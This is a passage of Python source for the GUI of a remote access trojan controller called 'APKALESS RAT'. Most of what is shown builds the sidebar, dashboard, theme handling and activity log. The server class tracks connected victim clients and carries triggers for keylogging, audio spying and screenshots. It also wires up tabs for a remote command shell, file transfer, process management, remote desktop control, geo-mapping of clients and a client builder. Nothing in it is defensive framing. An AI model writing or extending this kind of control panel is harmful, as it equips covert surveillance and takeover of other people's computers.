        message_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Add timestamp
        time_label = tk.Label(
            item_frame,
            text=time_str,
            foreground=theme["fg_color"],
            background=theme["card_color"],
            font=("Segoe UI", 8)
        )
        time_label.pack(side=tk.RIGHT, padx=5)
        
        # Store item in a list to track and update with theme changes
        if not hasattr(self, 'activity_items'):
            self.activity_items = []
        
        self.activity_items.append({
            'frame': item_frame,
            'icon': icon_label,
            'message': message_label,
            'time': time_label,
            'type': activity_type
        })
        
        # Limit list to 10 items
        if len(self.activity_items) > 10:
            old_item = self.activity_items.pop(0)
            old_item['frame'].destroy()
    
    
    def update_ui_elements(self):
        """Update all UI elements with fresh data"""
        try:
            
            # Update summary cards
            self.update_summary_cards()
            
            # Schedule the next update
            self.rat_server.root.after(1000, self.update_ui_elements)
        except Exception as e:
            print(f"Error updating UI elements: {e}")
            # Ensure the timer continues even if there's an error
            self.rat_server.root.after(1000, self.update_ui_elements)
    
    
    def update_summary_cards(self):
        """Update summary cards with fresh data"""
        try:
            # Update clients card
            client_count = len(self.rat_server.clients)
            self.summary_cards['clients'].value_label.configure(text=str(client_count))
            
            # Update sessions card
            active_sessions = sum(1 for client in self.rat_server.clients.values() 
                               if client[1] == self.rat_server.current_client_socket)
            self.summary_cards['sessions'].value_label.configure(text=str(active_sessions))
            
            # Update uptime card
            if self.rat_server.is_server_running and self.rat_server.start_time is not None:
                current_time = time.time()
                uptime_seconds = int(current_time - self.rat_server.start_time)
                
                # Format as HH:MM:SS
                hours, remainder = divmod(uptime_seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                uptime_str = f"{hours:02}:{minutes:02}:{seconds:02}"
                
                self.summary_cards['uptime'].value_label.configure(text=uptime_str)
            
        except Exception as e:
            print(f"Error updating summary cards: {e}")
    
    
    def update_activity_list(self):
        """Monitor rat_server logs and add them to the activity list"""
        # Override the rat_server log method to also update our activity list
        original_log = self.rat_server.log
        
        def enhanced_log(self, msg, log_type="info"):
            # Call original log method
            original_log(self, msg, log_type)
            
            # Add to activity timeline
            if hasattr(self, 'ui_enhancer'):
                self.ui_enhancer.add_activity_item(msg, log_type, time.time())
        
        # Replace the log method
        self.rat_server.log = enhanced_log.__get__(self.rat_server, type(self.rat_server))
        
        # Store reference to self in the rat_server
        self.rat_server.ui_enhancer = self

    
       
class RATServerGUI:
    def __init__(self):
        # Initialize server variables
        self.ip = self.get_local_ip()
        self.port = 4444
        self.address = (self.ip, self.port)
        self.is_server_running = False
        self.receive_screenshot_trigger = False
        self.audiospy_trigger = False
        self.keyboard_recording_trigger = False
        self.clients = {}
        self.threads_tracker = {}
        self.BUFFER = 4096
        self.client_counter = 0
        self.current_theme = "Dark"
        self.server_socket = None
        self.current_client_socket = None
        self.advanced_monitoring = None
        self.MAX_CACHE_SIZE = 3
        self.MAX_BUFFER_POOL_SIZE = 5
        # Make themes accessible to the instance
        self.THEMES = THEMES

        # Setup GUI (which will now initialize theme manager after UI components)
        self.setup_gui()
        
        # Initialize helpers after all UI is ready
        self.initialize_helpers()


    def initialize_helpers(self):
        """Initialize helper classes that enhance functionality"""
        # Add UI enhancer for modern interface
        if not hasattr(self, 'uienhance'):
            self.uienhance = UIEnhancer(self)
            
    def get_local_ip(self):
        s = socket.socket()
        s.connect(('1.1.1.1', 80))
        
        return str(s.getsockname()[0])
    
    def setup_gui(self):
        # Configure custom tkinter
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("blue")
        
        # Create root window
        self.root = ctk.CTk()
        self.root.title("APKALESS RAT")
        self.root.geometry("1200x700")
        self.root.minsize(800, 600)
        
        # Create main frame
        self.main_frame = ctk.CTkFrame(self.root)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Split into left sidebar and right content
        self.sidebar_frame = ctk.CTkFrame(self.main_frame, width=200)
        self.sidebar_frame.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        
        self.content_frame = ctk.CTkFrame(self.main_frame)
        self.content_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Setup status bar
        self.status_bar = ctk.CTkLabel(self.root, text="Ready", anchor="w")
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=5)
        
        # Setup sidebar
        self.setup_sidebar()
        
        # Setup content area
        self.setup_content_area()
        
        # Load settings
        self.load_settings()
        
        # Initialize theme manager after all UI elements are created
        self.setup_theme_manager()
        
    def setup_theme_manager(self):
        """Initialize the theme manager and track all theme-sensitive widgets."""
        self.theme_manager = ThemeManager(self, self.THEMES)
        
        # Track main frames
        self.theme_manager.track_widget(self.main_frame)
        self.theme_manager.track_widget(self.sidebar_frame)
        self.theme_manager.track_widget(self.content_frame)
        
        # Track notebook
        self.theme_manager.track_widget(self.notebook, "notebook")
        
        # Track tab frames
        self.theme_manager.track_widget(self.dashboard_frame)
        self.theme_manager.track_widget(self.clients_frame)
        self.theme_manager.track_widget(self.command_frame)
        self.theme_manager.track_widget(self.monitoring_frame)
        self.theme_manager.track_widget(self.settings_frame)
        
        # Track scrolledtext widgets
        self.theme_manager.track_widget(self.log_text, "scrolledtext")
        self.theme_manager.track_widget(self.terminal_output, "scrolledtext")
        if hasattr(self, 'keyboard_log'):
            self.theme_manager.track_widget(self.keyboard_log, "scrolledtext")
        
        # Track treeviews
        self.theme_manager.track_widget(self.clients_tree, "treeview")
        
        # Track menus
        self.theme_manager.track_widget(self.client_menu, "menu")
        
        # Track custom labels for modern dashboard
        if hasattr(self, 'server_status_label'):
            self.theme_manager.track_widget(self.server_status_label, "label")
        if hasattr(self, 'server_address_label'):
            self.theme_manager.track_widget(self.server_address_label, "label")
        if hasattr(self, 'server_status_light'):
            self.theme_manager.track_widget(self.server_status_light, "label")
        if hasattr(self, 'map_clients_count'):
            self.theme_manager.track_widget(self.map_clients_count, "label")
        
        # Track status indicators from old dashboard (if they exist)
        if hasattr(self, 'server_status_value'):
            self.theme_manager.track_widget(self.server_status_value, "label")
        if hasattr(self, 'clients_value'):
            self.theme_manager.track_widget(self.clients_value, "label")
        
        # Track display labels
        if hasattr(self, 'screen_display'):
            self.theme_manager.track_widget(self.screen_display, "label")
        if hasattr(self, 'audio_display'):
            self.theme_manager.track_widget(self.audio_display, "label")
        if hasattr(self, 'connected_client_label'):
            self.theme_manager.track_widget(self.connected_client_label, "label")
        if hasattr(self, 'status_bar'):
            self.theme_manager.track_widget(self.status_bar, "label")
        
        # Track buttons
        buttons = []
        if hasattr(self, 'start_server_btn'):
            buttons.append(self.start_server_btn)
        if hasattr(self, 'stop_server_btn'):
            buttons.append(self.stop_server_btn)
        if hasattr(self, 'start_screen_btn'):
            buttons.append(self.start_screen_btn)
        if hasattr(self, 'stop_screen_btn'):
            buttons.append(self.stop_screen_btn)
        if hasattr(self, 'start_audio_btn'):
            buttons.append(self.start_audio_btn)
        if hasattr(self, 'stop_audio_btn'):
            buttons.append(self.stop_audio_btn)
        if hasattr(self, 'start_keyboard_btn'):
            buttons.append(self.start_keyboard_btn)
        if hasattr(self, 'stop_keyboard_btn'):
            buttons.append(self.stop_keyboard_btn)
        
        for button in buttons:
            self.theme_manager.track_widget(button)
        
        # Track action buttons for newer dashboard
        if hasattr(self, 'action_buttons'):
            for button in self.action_buttons:
                self.theme_manager.track_widget(button)
        
        # Apply initial theme
        self.theme_manager.apply_theme(self.current_theme)
        
    def setup_sidebar(self):
        """Set up a modern, clean sidebar with improved layout and visual hierarchy"""
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create a container for the logo area with a more distinct separation
        logo_container = ctk.CTkFrame(self.sidebar_frame, fg_color="transparent")
        logo_container.pack(fill=tk.X, padx=0, pady=0)
        
        # Add a sleek accent bar at the top
        accent_bar = ctk.CTkFrame(logo_container, 
                                height=4, 
                                fg_color=theme["accent_color"],
                                corner_radius=0)
        accent_bar.pack(fill=tk.X, padx=0, pady=0)
        
        # Create a modern logo with icon and text
        logo_frame = ctk.CTkFrame(logo_container, fg_color="transparent")
        logo_frame.pack(fill=tk.X, padx=15, pady=(15, 20))
        
        # Use a custom icon symbol for the logo
        logo_icon = ctk.CTkLabel(logo_frame, 
                            text="⚡", 
                            font=ctk.CTkFont(size=28, weight="bold"),
                            text_color=theme["accent_color"])
        logo_icon.pack(side=tk.LEFT, padx=(0, 10))
        
        # Modern title with better typography
        logo_label = ctk.CTkLabel(logo_frame, 
                                text="RAT Console", 
                                font=ctk.CTkFont(size=22, weight="bold"),
                                text_color=theme["fg_color"])
        logo_label.pack(side=tk.LEFT)
        
        # Server controls section with cleaner styling
        server_frame = ctk.CTkFrame(self.sidebar_frame, 
                                fg_color=theme["card_color"],
                                corner_radius=8,  # Rounded corners
                                border_width=0)  # No border for cleaner look
        server_frame.pack(fill=tk.X, padx=15, pady=10)
        
        # Section heading with icon and improved typography
        server_header = ctk.CTkFrame(server_frame, fg_color="transparent")
        server_header.pack(fill=tk.X, padx=12, pady=(12, 5))
        
        server_icon = ctk.CTkLabel(server_header, 
                                text="🖥️", 
                                font=ctk.CTkFont(size=16),
                                width=25,
                                text_color=theme["accent_color"])
        server_icon.pack(side=tk.LEFT)
        
        server_label = ctk.CTkLabel(server_header, 
                                text="Server Controls",  # Title case instead of all caps
                                font=ctk.CTkFont(size=14, weight="bold"),
                                text_color=theme["fg_color"])
        server_label.pack(side=tk.LEFT, padx=5)
        
        # IP and Port inputs with improved styling
        input_container = ctk.CTkFrame(server_frame, fg_color="transparent")
        input_container.pack(fill=tk.X, padx=12, pady=(5, 12))
        
        # IP input with label above for better layout
        ip_container = ctk.CTkFrame(input_container, fg_color="transparent")
        ip_container.pack(fill=tk.X, pady=(0, 8))
        
        ip_label = ctk.CTkLabel(ip_container, 
                            text="IP Address", 
                            anchor="w",
                            font=ctk.CTkFont(size=12),
                            text_color=theme["fg_color"])
        ip_label.pack(anchor="w", padx=5, pady=(0, 3))
        
        self.ip_entry = ctk.CTkEntry(ip_container, 
                                fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"], 
                                text_color=theme["fg_color"],
                                border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                border_width=1,
                                corner_radius=6,  # Rounded corners
                                height=30)
        self.ip_entry.pack(fill=tk.X, pady=0)
        self.ip_entry.insert(0, self.ip)
        
        # Port input with label above
        port_container = ctk.CTkFrame(input_container, fg_color="transparent")
        port_container.pack(fill=tk.X, pady=0)
        
        port_label = ctk.CTkLabel(port_container, 
                                text="Port", 
                                anchor="w",
                                font=ctk.CTkFont(size=12),
                                text_color=theme["fg_color"])
        port_label.pack(anchor="w", padx=5, pady=(0, 3))
        
        self.port_entry = ctk.CTkEntry(port_container,
                                    fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"], 
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                    border_width=1,
                                    corner_radius=6,  # Rounded corners
                                    height=30)
        self.port_entry.pack(fill=tk.X, pady=0)
        self.port_entry.insert(0, str(self.port))
        
        # Button container for aligned buttons
        button_container = ctk.CTkFrame(server_frame, fg_color="transparent")
        button_container.pack(fill=tk.X, padx=12, pady=(5, 12))
        
        # Server buttons with improved styling
        self.start_server_btn = ctk.CTkButton(button_container, 
                                            text="Start Server",  # Title case
                                            command=self.start_server_gui,
                                            fg_color=theme["success_color"],
                                            text_color="#FFFFFF",  # White text for better contrast
                                            border_width=0,
                                            corner_radius=6,  # Rounded corners
                                            height=35,
                                            font=ctk.CTkFont(size=13, weight="bold"))
        self.start_server_btn.pack(fill=tk.X, pady=(0, 5))
        
        self.stop_server_btn = ctk.CTkButton(button_container, 
                                        text="Stop Server",  # Title case
                                        command=self.stop_server, 
                                        state="disabled",
                                        fg_color=theme["danger_color"],
                                        text_color="#FFFFFF",  # White text for better contrast
                                        border_width=0,
                                        corner_radius=6,  # Rounded corners
                                        height=35,
                                        font=ctk.CTkFont(size=13, weight="bold"))
        self.stop_server_btn.pack(fill=tk.X)
        
        # Create a divider for visual separation
        divider = ctk.CTkFrame(self.sidebar_frame, 
                            height=1, 
                            fg_color=theme["border_color"] if "border_color" in theme else theme["bg_color"],
                            corner_radius=0)
        divider.pack(fill=tk.X, padx=15, pady=10)
        
        # Settings section with improved design
        settings_frame = ctk.CTkFrame(self.sidebar_frame, 
                                    fg_color=theme["card_color"],
                                    corner_radius=8,  # Rounded corners
                                    border_width=0)  # No border for cleaner look
        settings_frame.pack(fill=tk.X, padx=15, pady=10)
        
        # Settings header with icon
        settings_header = ctk.CTkFrame(settings_frame, fg_color="transparent")
        settings_header.pack(fill=tk.X, padx=12, pady=(12, 5))
        
        settings_icon = ctk.CTkLabel(settings_header, 
                                text="⚙️", 
                                font=ctk.CTkFont(size=16),
                                width=25,
                                text_color=theme["accent_color"])
        settings_icon.pack(side=tk.LEFT)
        
        settings_label = ctk.CTkLabel(settings_header, 
                                    text="Appearance",  # Title case instead of all caps
                                    font=ctk.CTkFont(size=14, weight="bold"),
                                    text_color=theme["fg_color"])
        settings_label.pack(side=tk.LEFT, padx=5)
        
        # Theme selection with improved styling
        theme_container = ctk.CTkFrame(settings_frame, fg_color="transparent")
        theme_container.pack(fill=tk.X, padx=12, pady=(5, 12))
        
        theme_label = ctk.CTkLabel(theme_container, 
                                text="Theme", 
                                anchor="w",
                                font=ctk.CTkFont(size=12),
                                text_color=theme["fg_color"])
        theme_label.pack(anchor="w", padx=5, pady=(0, 3))
        
        self.theme_var = tk.StringVar(value=self.current_theme)
        theme_options = ctk.CTkOptionMenu(theme_container, 
                                        values=list(self.THEMES.keys()), 
                                        variable=self.theme_var, 
                                        command=self.change_theme,
                                        fg_color=theme["button_color"],
                                        button_color=theme["accent_color"],
                                        button_hover_color=theme["hover_color"],
                                        dropdown_fg_color=theme["card_color"],
                                        dropdown_hover_color=theme["hover_color"],
                                        dropdown_text_color=theme["fg_color"],
                                        text_color=theme["fg_color"],
                                        corner_radius=6,  # Rounded corners
                                        font=ctk.CTkFont(size=13))
        theme_options.pack(fill=tk.X)
        
        # Add status indicator at the bottom
        status_container = ctk.CTkFrame(self.sidebar_frame, fg_color="transparent")
        status_container.pack(fill=tk.X, side=tk.BOTTOM, padx=15, pady=15)
        
        status_indicator = ctk.CTkFrame(status_container, fg_color="transparent")
        status_indicator.pack(side=tk.LEFT)
        
        self.status_dot = ctk.CTkLabel(status_indicator, 
                                    text="●", 
                                    font=ctk.CTkFont(size=16),
                                    text_color=theme["danger_color"])  # Default to offline
        self.status_dot.pack(side=tk.LEFT)
        
        self.status_text = ctk.CTkLabel(status_indicator, 
                                    text="Server Offline", 
                                    font=ctk.CTkFont(size=12),
                                    text_color=theme["fg_color"])
        self.status_text.pack(side=tk.LEFT, padx=5)
        
        # Version text at bottom right
        self.version_label = ctk.CTkLabel(status_container, 
                                        text="v1.0", 
                                        font=ctk.CTkFont(size=10),
                                        text_color=theme["fg_color"])
        self.version_label.pack(side=tk.RIGHT)
        
        # Store sidebar components for theme updates
        self.sidebar_components = {
            "logo_icon": logo_icon,
            "logo_label": logo_label,
            "accent_bar": accent_bar,
            "server_frame": server_frame,
            "server_icon": server_icon,
            "server_label": server_label,
            "settings_frame": settings_frame,
            "settings_icon": settings_icon,
            "settings_label": settings_label,
            "ip_label": ip_label,
            "port_label": port_label,
            "theme_label": theme_label,
            "divider": divider,
            "status_dot": self.status_dot,
            "status_text": self.status_text,
            "version_label": self.version_label,
            "theme_options": theme_options
        }
        
        # Track all sidebar widgets with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(logo_container)
            self.theme_manager.track_widget(accent_bar)
            self.theme_manager.track_widget(logo_frame)
            self.theme_manager.track_widget(logo_icon)
            self.theme_manager.track_widget(logo_label)
            self.theme_manager.track_widget(server_frame)
            self.theme_manager.track_widget(server_header)
            self.theme_manager.track_widget(server_icon)
            self.theme_manager.track_widget(server_label)
            self.theme_manager.track_widget(input_container)
            self.theme_manager.track_widget(ip_container)
            self.theme_manager.track_widget(ip_label)
            self.theme_manager.track_widget(self.ip_entry)
            self.theme_manager.track_widget(port_container)
            self.theme_manager.track_widget(port_label)
            self.theme_manager.track_widget(self.port_entry)
            self.theme_manager.track_widget(button_container)
            self.theme_manager.track_widget(self.start_server_btn)
            self.theme_manager.track_widget(self.stop_server_btn)
            self.theme_manager.track_widget(divider)
            self.theme_manager.track_widget(settings_frame)
            self.theme_manager.track_widget(settings_header)
            self.theme_manager.track_widget(settings_icon)
            self.theme_manager.track_widget(settings_label)
            self.theme_manager.track_widget(theme_container)
            self.theme_manager.track_widget(theme_label)
            self.theme_manager.track_widget(theme_options)
            self.theme_manager.track_widget(status_container)
            self.theme_manager.track_widget(status_indicator)
            self.theme_manager.track_widget(self.status_dot)
            self.theme_manager.track_widget(self.status_text)
            self.theme_manager.track_widget(self.version_label)



    def update_server_status_indicator(self, is_running=False):
        """Update the server status indicator in the sidebar"""
        theme = self.THEMES[self.current_theme]
        
        if is_running:
            self.status_dot.configure(text_color=theme["success_color"])
            self.status_text.configure(text="Server Online")
        else:
            self.status_dot.configure(text_color=theme["danger_color"])
            self.status_text.configure(text="Server Offline")

    def setup_content_area(self):
       # Create notebook for tabbed interface
        self.notebook = ttk.Notebook(self.content_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        theme = self.THEMES[self.current_theme]
        self.theme_manager = ThemeManager(self, THEMES)
        self.theme_manager.track_widget(self.notebook, "notebook") 
        
        # Dashboard tab
        self.dashboard_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.dashboard_frame, text="Dashboard")
        self.setup_dashboard()
        
        # Clients tab
        self.clients_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.clients_frame, text="Clients")  
        self.setup_clients_tab()
        
        self.geo_mapping = EnhancedClientGeoMapping(self.notebook, self)
        
        # Command tab
        self.command_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.command_frame, text="Command Shell")
        self.setup_command_tab()
        
        # Monitoring tab
        self.monitoring_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.monitoring_frame, text="Monitoring")
        self.setup_monitoring_tab()
        
        # Initialize File Transfer System
        self.file_transfer = FileTransferSystem(self.notebook, self)
        
        self.process_manager = ProcessManager(self.notebook, self)
        
        # Initialize Advanced Monitoring
        self.advanced_monitoring = AdvancedMonitoringInterface(self.notebook, self)
        
        # Initialize Desktop Control
        self.remote_desktop = RemoteDesktopControl(self.notebook, self)
        
        # Initialize Client Builder Utility
        self.client_builder = ClientBuilderUtility(self.notebook, self)
        
        # Settings tab
        self.settings_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.settings_frame, text="Settings")
        self.setup_settings_tab()
        self.uienhance = UIEnhancer(self)
                
    def setup_dashboard(self):
        """Set up a modern, visually appealing dashboard with enhanced metrics and data visualization"""
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create main container with padding
        main_container = ctk.CTkFrame(self.dashboard_frame, fg_color="transparent")
        main_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Create a header section
        self.create_dashboard_header(main_container)
        
        # Create a grid layout with flexible columns
        dashboard_grid = ctk.CTkFrame(main_container, fg_color="transparent")
        dashboard_grid.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Configure grid columns
        dashboard_grid.columnconfigure(0, weight=2)  # Left column (wider)
        dashboard_grid.columnconfigure(1, weight=1)  # Right column
        
        # Create left and right frames
        dashboard_left = ctk.CTkFrame(dashboard_grid, fg_color="transparent")
        dashboard_left.grid(row=0, column=0, sticky="nsew", padx=(0, 10))
        
        dashboard_right = ctk.CTkFrame(dashboard_grid, fg_color="transparent")
        dashboard_right.grid(row=0, column=1, sticky="nsew", padx=(10, 0))
        
        # Setup left column with status cards and activity log
        self.setup_left_column(dashboard_left)
        
        # Setup right column with performance metrics and alerts
        self.setup_right_column(dashboard_right)
        
        # Start performance monitoring thread
        self.start_performance_monitoring()
        
        # Register main container with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(main_container)
            self.theme_manager.track_widget(dashboard_grid)
            self.theme_manager.track_widget(dashboard_left)
            self.theme_manager.track_widget(dashboard_right)

    def create_dashboard_header(self, parent):
        """Create a modern header with summary statistics"""
        theme = self.THEMES[self.current_theme]
        
        # Create header container
        header_container = ctk.CTkFrame(parent, fg_color="transparent")
        header_container.pack(fill=tk.X, pady=(0, 15))
        
        # Server status indicator
        status_container = ctk.CTkFrame(header_container, 
                                    fg_color=theme["card_color"],
                                    corner_radius=12,
                                    border_width=0)
        status_container.pack(side=tk.LEFT, fill=tk.Y)
        
        # Create status light
        self.server_status_light = ctk.CTkLabel(status_container, 
                                            text="●", 
                                            font=ctk.CTkFont(size=24),
                                            text_color=theme["danger_color"])
        self.server_status_light.pack(side=tk.LEFT, padx=(15, 5), pady=12)
        
        status_text_frame = ctk.CTkFrame(status_container, fg_color="transparent")
        status_text_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 15), pady=12)
        
        self.server_status_label = ctk.CTkLabel(status_text_frame, 
                                            text="Server Offline", 
                                            font=ctk.CTkFont(size=16, weight="bold"),
                                            text_color=theme["fg_color"])
        self.server_status_label.pack(anchor="w")
        
        self.server_address_label = ctk.CTkLabel(status_text_frame, 
                                            text=f"{self.ip}:{self.port}", 
                                            font=ctk.CTkFont(size=12),
                                            text_color=theme["fg_color"])
        self.server_address_label.pack(anchor="w")
        
        # Summary statistics cards
        self.create_summary_cards(header_container)
        
        # Register with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(header_container)
            self.theme_manager.track_widget(status_container)
            self.theme_manager.track_widget(self.server_status_light, "label")
            self.theme_manager.track_widget(status_text_frame)
            self.theme_manager.track_widget(self.server_status_label, "label")
            self.theme_manager.track_widget(self.server_address_label, "label")

    def create_summary_cards(self, parent):
        """Create summary statistic cards for the dashboard header"""
        theme = self.THEMES[self.current_theme]
        
        # Create container for cards
        cards_container = ctk.CTkFrame(parent, fg_color="transparent")
        cards_container.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Create and store the summary cards
        self.summary_cards = {}
        
        # Uptime card
        uptime_card = self.create_stat_card(
            cards_container,
            "🇮🇶",
            "AKPKALESS",
            "00:00:00",
            theme["success_color"]
        )
        uptime_card.pack(side=tk.LEFT, padx=5)
        self.summary_cards['uptime'] = uptime_card
        
        # CPU usage card
        cpu_card = self.create_stat_card(
            cards_container,
            "IG",
            "apkaless",
            "▶︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10",
            theme["accent_color"]
        )
        cpu_card.pack(side=tk.LEFT, padx=5)
        self.summary_cards['cpu'] = cpu_card
        
        # Register with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(cards_container)
            for card_key, card in self.summary_cards.items():
                self.theme_manager.track_widget(card)
                for child in card.winfo_children():
                    self.theme_manager.track_widget(child)

    def create_stat_card(self, parent, icon, title, value, color):
        """Create a stylish statistic card with icon, title and value"""
        theme = self.THEMES[self.current_theme]
        
        # Create card frame
        card = ctk.CTkFrame(
            parent,
            fg_color=theme["card_color"],
            corner_radius=12,
            width=120,
            height=74
        )
        
        # Create icon with accent color
        icon_label = ctk.CTkLabel(
            card,
            text=icon,
            font=ctk.CTkFont(size=15),
            text_color=color
        )
        icon_label.place(x=12, y=12)
        
        # Create title with smaller, muted text
        title_label = ctk.CTkLabel(
            card,
            text=title,
            font=ctk.CTkFont(size=11),
            text_color=theme["fg_color"]
        )
        title_label.place(x=40, y=12)
        
        # Create value with larger, bold text
        value_label = ctk.CTkLabel(
            card,
            text=value,
            font=ctk.CTkFont(size=18, weight="bold"),
            text_color=theme["fg_color"]
        )
        value_label.place(x=40, y=34)
        
        # Store labels as attributes for updating
        card.icon_label = icon_label
        card.title_label = title_label
        card.value_label = value_label
        card.accent_color = color
        
        return card

    def setup_left_column(self, parent):
        """Setup the left column with server status card and action buttons"""
        theme = self.THEMES[self.current_theme]
        
        # Create a section for quick action buttons
        self.create_quick_actions_section(parent)
        
        # Create activity log section
        self.create_activity_log_section(parent)

    def create_quick_actions_section(self, parent):
        """Create a modern quick actions section with icon buttons"""
        theme = self.THEMES[self.current_theme]
        
        # Create frame for quick actions
        actions_frame = ctk.CTkFrame(
            parent,
            fg_color=theme["card_color"],
            corner_radius=12,
            border_width=0
        )
        actions_frame.pack(fill=tk.X, pady=(0, 15))
        
        # Create header with icon
        header_frame = ctk.CTkFrame(actions_frame, fg_color="transparent")
        header_frame.pack(fill=tk.X, padx=15, pady=(15, 10))
        
        header_icon = ctk.CTkLabel(
            header_frame,
            text="⚡",
            font=ctk.CTkFont(size=16),
            text_color=theme["accent_color"],
            width=25
        )
        header_icon.pack(side=tk.LEFT)
        
        header_label = ctk.CTkLabel(
            header_frame,
            text="Quick Actions",
            font=ctk.CTkFont(size=16, weight="bold"),
            text_color=theme["fg_color"]
        )
        header_label.pack(side=tk.LEFT)
        
        # Create buttons container
        buttons_container = ctk.CTkFrame(actions_frame, fg_color="transparent")
        buttons_container.pack(fill=tk.X, padx=15, pady=(0, 15))
        
        # Configure grid
        buttons_container.columnconfigure(0, weight=1)
        buttons_container.columnconfigure(1, weight=1)
        
        # Store action buttons for theme updates
        self.action_buttons = []
        
        # Create stylish action buttons
        refresh_btn = self.create_action_button(
            buttons_container,
            "Refresh Clients",
            "🔄",
            self.refresh_clients,
            0, 0, 25, 0.5, 0.15
        )
        self.action_buttons.append(refresh_btn)
        
        disconnect_btn = self.create_action_button(
            buttons_container,
            "Disconnect All",
            "❌",
            self.disconnect_all,
            0, 1, 25, 0.5, 0.13
        )
        self.action_buttons.append(disconnect_btn)
        
        screen_btn = self.create_action_button(
            buttons_container,
            "Screen Capture",
            "📷",
            self.quick_screen_capture,
            1, 0, 25, 0.5, 0.13
        )
        self.action_buttons.append(screen_btn)
        
        shell_btn = self.create_action_button(
            buttons_container,
            "Command Shell",
            "💻",
            self.quick_command_shell,
            1, 1, 25, 0.5, 0.13
        )
        self.action_buttons.append(shell_btn)
        
        # Register with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(actions_frame)
            self.theme_manager.track_widget(header_frame)
            self.theme_manager.track_widget(header_icon, "label")
            self.theme_manager.track_widget(header_label, "label")
            self.theme_manager.track_widget(buttons_container)
            for btn in self.action_buttons:
                self.theme_manager.track_widget(btn)

    def create_action_button(self, parent, text, icon, command, row, column, fsize, relx, rely):
        """Create a modern action button with icon and hover effect"""
        theme = self.THEMES[self.current_theme]
        
        # Create button with modern styling
        button = ctk.CTkButton(
            parent,
            text=text,
            image=None,  # Will be created differently
            compound="top",
            command=command,
            fg_color=theme["card_color"],
            hover_color=self._lighten_color(theme["card_color"]) if "Dark" in self.current_theme else self._darken_color(theme["card_color"]),
            text_color=theme["fg_color"],
            corner_radius=8,
            border_width=1,
            border_color=theme["border_color"] if "border_color" in theme else self._lighten_color(theme["card_color"]),
            height=80,
            font=ctk.CTkFont(size=13)
        )
        button.grid(row=row, column=column, padx=5, pady=5, sticky="nsew")
        
        # Add icon
        icon_label = ctk.CTkLabel(
            button,
            text=icon,
            font=ctk.CTkFont(size=fsize),
            text_color=theme["accent_color"]
        )
        icon_label.place(relx=relx, rely=rely, anchor="center")
        
        # Store icon for theme updates
        button.icon_label = icon_label
        
        return button

    def create_activity_log_section(self, parent):
        """Create an enhanced activity log with styled entries"""
        theme = self.THEMES[self.current_theme]
        
        # Create log frame with modern styling
        log_frame = ctk.CTkFrame(
            parent,
            fg_color=theme["card_color"],
            corner_radius=12,
            border_width=0
        )
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create header with icon
        header_frame = ctk.CTkFrame(log_frame, fg_color="transparent")
        header_frame.pack(fill=tk.X, padx=15, pady=(15, 5))
        
        header_icon = ctk.CTkLabel(
            header_frame,
            text="📋",
            font=ctk.CTkFont(size=16),
            text_color=theme["accent_color"],
            width=25
        )
        header_icon.pack(side=tk.LEFT)
        
        header_label = ctk.CTkLabel(
            header_frame,
            text="Activity Log",
            font=ctk.CTkFont(size=16, weight="bold"),
            text_color=theme["fg_color"]
        )
        header_label.pack(side=tk.LEFT)
        
        # Add button controls
        controls_frame = ctk.CTkFrame(header_frame, fg_color="transparent")
        controls_frame.pack(side=tk.RIGHT)
        
        clear_log_btn = ctk.CTkButton(
            controls_frame,
            text="Clear",
            command=self.clear_activity_log,
            fg_color="transparent",
            hover_color=self._lighten_color(theme["card_color"]) if "Dark" in self.current_theme else self._darken_color(theme["card_color"]),
            text_color=theme["fg_color"],
            corner_radius=6,
            border_width=1,
            border_color=theme["border_color"] if "border_color" in theme else self._lighten_color(theme["card_color"]),
            width=60,
            height=28,
            font=ctk.CTkFont(size=12)
        )
        clear_log_btn.pack(side=tk.LEFT, padx=2)
        self.action_buttons.append(clear_log_btn)
        
        save_log_btn = ctk.CTkButton(
            controls_frame,
            text="Save",
            command=self.save_activity_log,
            fg_color="transparent",
            hover_color=self._lighten_color(theme["card_color"]) if "Dark" in self.current_theme else self._darken_color(theme["card_color"]),
            text_color=theme["fg_color"],
            corner_radius=6,
            border_width=1,
            border_color=theme["border_color"] if "border_color" in theme else self._lighten_color(theme["card_color"]),
            width=60,
            height=28,
            font=ctk.CTkFont(size=12)
        )
        save_log_btn.pack(side=tk.LEFT, padx=2)
        self.action_buttons.append(save_log_btn)
        
        # Enhanced log with custom styling
